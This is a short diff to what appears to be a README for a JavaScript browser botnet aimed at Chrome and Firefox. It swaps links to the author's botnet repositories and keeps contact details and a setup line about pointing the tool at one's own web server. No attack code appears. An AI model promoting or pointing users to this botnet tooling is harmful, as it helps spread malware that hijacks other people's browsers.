@@ -40,6 +40,8 @@ change http://1127.0.0.1     to your web server
 waring !!!!!!!
 # Version pro 
 
+https://github.com/hakanonymos/botnet-browser-chrome-firefox-V2
+
 ##################################################
 
 Email : hakanonymos@hotmail.com
@@ -54,8 +56,8 @@ Instagram : https://www.instagram.com/hakanonymos
 
 https://www.youtube.com/watch?v=ljZsw3bRxPY&t=1s
 
-# New version Browser javascript Botent V 3
-https://github.com/hakanonymos/browser-javascript-botnet-v3
+# New version Botnet javascript Firefox Chrome V 2
+https://github.com/hakanonymos/botnet-browser-chrome-firefox-V2
   
 
 
